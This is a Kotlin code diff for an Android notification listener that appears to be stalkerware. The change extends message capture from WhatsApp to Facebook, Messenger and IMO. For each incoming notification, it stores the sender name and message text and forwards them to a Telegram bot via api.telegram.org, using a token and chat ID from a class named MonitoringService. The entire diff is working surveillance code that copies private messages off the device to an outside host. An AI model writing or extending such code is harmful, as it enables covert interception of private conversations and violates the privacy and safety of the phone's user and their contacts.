@@ -22,16 +22,32 @@ class WhatsAppListener : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         sbn ?: return
         val pkg = sbn.packageName ?: return
-        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
+
+        val app = when (pkg) {
+            "com.whatsapp", "com.whatsapp.w4b" -> "whatsapp"
+            "com.facebook.katana", "com.facebook.orca" -> "fb"
+            "com.imo.android.imoim", "com.imo.android.imoimbeta" -> "imo"
+            else -> return
+        }
 
         val extras = sbn.notification?.extras ?: return
         val title = extras.getString(Notification.EXTRA_TITLE) ?: return
         val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: return
 
+        if (title == text) return
+
+        MessageStore.addMessage(this, app, title, text)
+
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
-                val msg = "💬 WhatsApp\nFrom: $title\n$text"
+                val emoji = when (app) {
+                    "whatsapp" -> "💬"
+                    "fb" -> "📘"
+                    "imo" -> "📱"
+                    else -> "📩"
+                }
+                val msg = "$emoji ${app.uppercase()}\nFrom: $title\n$text"
                 val json = JSONObject().apply {
                     put("chat_id", MonitoringService.CHAT_ID)
                     put("text", msg)
